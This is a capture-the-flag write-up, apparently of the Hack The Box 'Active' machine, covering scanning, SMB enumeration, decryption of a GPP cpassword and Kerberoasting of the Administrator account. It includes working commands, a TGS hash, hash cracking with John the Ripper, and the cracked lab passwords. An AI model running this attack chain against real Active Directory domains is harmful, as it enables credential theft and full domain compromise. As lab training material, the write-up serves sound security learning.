

```bash
# Nmap 7.95 scan initiated Sat Jul 19 12:44:17 2025 as: /usr/lib/nmap/nmap --privileged -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49155,49157,49158,49165,49166,49168 -sC -sV -oN activeServicesVersionsNmap 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.046s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 16:44:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-19T16:45:19
|_  start_date: 2025-07-19T16:28:11

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 19 12:45:26 2025 -- 1 IP address (1 host up) scanned in 69.33 seconds

```

- Windows Server 2008 R2 SP1
- Domain active.htb

- 135/445 indicate smb usage
	- using smbclient to anonymously sign into an view shares
	```bash
smbclient //10.10.10.100/Replication -U ""%""
	```
	- digging through shares reveals cpassword in \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
	```
	╭─ ~/htb/active ▓▒░────────────────────────────────────────────────────────────────────░▒▓ ✔  03:04:07 PM 
	╰─ cat Groups.xml 
	<?xml version="1.0" encoding="utf-8"?>
	<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
	</Groups>
	```
	- This is new to me so I had to search and understand it.
		- Windows 2008 Groups.xml cpassword [Privilage Escalation via Group Policy Preferences GPP](https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp)
		- user - active.htb\SVC_TGS
		- cpassword - edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
		- cpassword is an encrypted using AES
		- [microsoft MSDN: AES key](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)
			- The 32-byte AES key is as follows:
			- 4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
			- f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
	```bash
	╭─ ~/htb/active ▓▒░──────────────────────────────────────────────────────────────────░▒▓ 1 ✘  03:47:30 PM 
	╰─ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
	GPPstillStandingStrong2k18
	```
	- gpp-decrypt decrypt's password to GPPstillStandingStrong2k18
- using the username password combination SVC_TGS / GPPstillStandingStrong2k18 
	- `nxc smb 10.10.10.100 -u '' -p '' -M gpp_password -o`
	```bash
	[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
	 
	```
- Now that we have access to additional shares we should login access them looking for the user flag
	```bash
	smbclient //10.10.10.100/Users -U "SVC_TGS"%"GPPstillStandingStrong2k18"                                                                             
Try "help" to get a list of possible commands.                                                                                                          
smb: \> ls                                                                                                                                              
  .                                  DR        0  Sat Jul 21 10:39:20 2018                                                                              
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 276436 blocks available

	```
- Directory SVC_TGS/Desktop for the user flag

- now that we have Domain creds we run bloodhound
	- specifcally nxc to ingest bloodhound data
	- `nxc ldap 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -k --dns-server 10.10.10.100 --bloodhound --collection All`

- Then we queried bloodhound data for 
	- Shortest path to domain admin
	![[Pasted image 20250720125636.png]]
	- kerberoastable users and found Administrator to be
	![[Pasted image 20250720125844.png]]

- Using nxc kerberoasting to extract TGS 
```bash
nxc ldap active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting SVC_TGS.TGSoutput.txt
LDAP        10.10.10.100    389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)
LDAP        10.10.10.100    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        10.10.10.100    389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.10.10.100    389    DC               [*] Total of records returned 1
LDAP        10.10.10.100    389    DC               [*] sAMAccountName: Administrator, memberOf: ['CN=Group Policy Creator Owners,CN=Users,D
C=active,DC=htb', 'CN=Domain Admins,CN=Users,DC=active,DC=htb', 'CN=Enterprise Admins,CN=Users,DC=active,DC=htb', 'CN=Schema Admins,CN=Users
,DC=active,DC=htb', 'CN=Administrators,CN=Builtin,DC=active,DC=htb'], pwdLastSet: 2018-07-18 15:06:40.351723, lastLogon: 2025-07-19 12:29:34
.084182
LDAP        10.10.10.100    389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$355bcb1eb3e0cceb776ad2b1
124e793a$834242260f154a2d72a53673627c3609e1ce6da38af405f099758475e224d4c91b01d18d2aa9b49da52080e6e42ebfccf14fc900f7d6a95b7f1fb84fc9075aeab75
e009a55c644ea033d8c79b4391183fde2c35df51e46317d222e968b2849c6163adc4eb3da00c359af442840d6d0bde9a7eca0a9125c151c10d66ad58a658647042842fbf186b
79e1fe3f104178282cf6ae659035d2d7504a35ded8e6d0a28902d33475150915aa627ac97e26a1007e8b0707a2d85179bf5542fd52ad8c8ecf410d0a7dbc9154b00076c32bab
18b8f65b6652263f076bc386b7453df280ba64bfe8e44d429a91b9f8cd01b13d3a485831816d892a3ec362279d661703b682151bfaa74f2f23dc93f774605d8a64a0be54bf93
7ea004a3b927599d4b7245e5dca1091f91a8b279c4398fec53af761118b24720a9ef35edf1a23a07c4fb73dd4d6f1cbfb4c55588e027eaf491e0495b39574b18b8fa9985b7c9
81d3117e1351b34cd79e3f2f5e8f23f7f7a796fc4bb71a0cfcf1ac82dd571afdababf16a7cb556abf29dce2ad57018d43e5b8e886c9a4b18b33896e7cc6b9bf7fc4ab3c94a62
5e49e64b921087f76b0b8d5c313724b43261cc1a6814800ed9ffe1ac113527c956a64a17d6b2ee1cfa7253abe7e0510c1acda8015c5c52775a563694e830a7170c62d5811643
1fdf51a2b66b7006b5e861daab9c180c5df6cc5ea8199b75d6cb05285ae076a6fceb9a7f6d15fa3e9d4d8d99b299ad1584e7b2c9b920408a25c7afc81a2851e2008cd54e4602
c9292dbd6f32298539bb144ee913861210c26439f94dfcaacafb16696d4d7662b760a2e0fc7bbf7bdd007819d856a692d1b538be0049cf3c3b4796c8f255a8a1160423d96166
ae13da1019c5483083729068196021c2ddafe1aa6a96e38145474261ef2269faf4a2b96ae0f03b5b2721e2b4e9d3f74d0dbd88b54f6f42507059b1af34d9d59542b63cd147c3
4d26da0140f1b2b13f68f180401e14cf0c309e1b76ca9818dd295223614398e3833355c599665af80b5adca127dd9f6be4e961082531e934c0d5b89fa7de72bb136180057461
6632f76ad5ecde4f62eb46c30a01f2a05e52e86e653e40fb52297e7dcd495526658c0d8034828f49b037a9d1cf0e10007d22da3f4337942d5d4751bb85a6270322bc7c805ec3
f0d187e8b1b529e8220a4a8c8d616f0eda491b8cffe9a0a3744775a6089d7823978b78a9cae67d8421f356676a244bd276ddf65e5b609

```

- now that we have the encrypted hash we can decrypt it with JohnTheRipper
	- password for administrator is Ticketmaster1968
```bash
john SVC_TGS.TGSoutput.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:04 DONE (2025-07-20 12:05) 0.2188g/s 2305Kp/s 2305Kc/s 2305KC/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
	
```
- now that we have the password for administrator we can use smbclient to login to the Users share and get the root flag
	```bash
	smbclient //10.10.10.100/Users -U "Administrator"%"Ticketmaster1968"                                
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 276132 blocks available
smb: \> cd Administrator\
smb: \Administrator\> dir
  .                                   D        0  Mon Jul 16 06:14:21 2018
  ..                                  D        0  Mon Jul 16 06:14:21 2018
  AppData                           DHn        0  Sat Jul 19 12:28:44 2025
  Application Data                DHSrn        0  Mon Jul 16 06:14:15 2018
  Contacts                           DR        0  Mon Jul 30 09:50:10 2018
  Cookies                         DHSrn        0  Mon Jul 16 06:14:15 2018
  Desktop                            DR        0  Thu Jan 21 11:49:47 2021
  Documents                          DR        0  Mon Jul 30 09:50:10 2018
  Downloads                          DR        0  Thu Jan 21 11:52:32 2021
  Favorites                          DR        0  Mon Jul 30 09:50:10 2018
  Links                              DR        0  Mon Jul 30 09:50:10 2018
  Local Settings                  DHSrn        0  Mon Jul 16 06:14:15 2018
  Music                              DR        0  Mon Jul 30 09:50:10 2018
  My Documents                    DHSrn        0  Mon Jul 16 06:14:15 2018
  NetHood                         DHSrn        0  Mon Jul 16 06:14:15 2018
  NTUSER.DAT                       AHSn   524288  Sat Jul 19 12:29:34 2025
  ntuser.dat.LOG1                   AHS   262144  Sat Jul 19 13:04:35 2025
  ntuser.dat.LOG2                   AHS        0  Mon Jul 16 06:14:09 2018
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf    AHS    65536  Mon Jul 16 06:14:15 2018
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Jul 16 06:14:15 2018
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Jul 16 06:14:15 2018
  ntuser.ini                         HS       20  Mon Jul 16 06:14:15 2018
  Pictures                           DR        0  Mon Jul 30 09:50:10 2018
  PrintHood                       DHSrn        0  Mon Jul 16 06:14:15 2018
  Recent                          DHSrn        0  Mon Jul 16 06:14:15 2018
  Saved Games                        DR        0  Mon Jul 30 09:50:10 2018
  Searches                           DR        0  Mon Jul 30 09:50:10 2018
  SendTo                          DHSrn        0  Mon Jul 16 06:14:15 2018
  Start Menu                      DHSrn        0  Mon Jul 16 06:14:15 2018
  Templates                       DHSrn        0  Mon Jul 16 06:14:15 2018
  Videos                             DR        0  Mon Jul 30 09:50:10 2018

                5217023 blocks of size 4096. 276132 blocks available
smb: \Administrator\> cd Desktop\
smb: \Administrator\Desktop\> dir
  .                                  DR        0  Thu Jan 21 11:49:47 2021
  ..                                 DR        0  Thu Jan 21 11:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 09:50:10 2018
  root.txt                           AR       34  Sat Jul 19 12:29:30 2025

                5217023 blocks of size 4096. 276132 blocks available

	```












